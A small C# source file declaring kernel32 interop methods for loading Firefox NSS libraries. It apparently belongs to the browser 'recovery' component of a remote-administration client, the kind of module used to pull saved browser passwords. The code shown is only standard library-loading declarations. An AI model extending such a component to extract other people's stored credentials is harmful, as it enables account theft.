using System;
using System.Runtime.InteropServices;

namespace RemoteAdmin.Client.Recovery.Browsers
{
	/// <summary>
	/// Native methods for loading Firefox NSS libraries
	/// </summary>
	internal static class NativeMethods
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr LoadLibrary(string dllToLoad);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool FreeLibrary(IntPtr hModule);
	}
}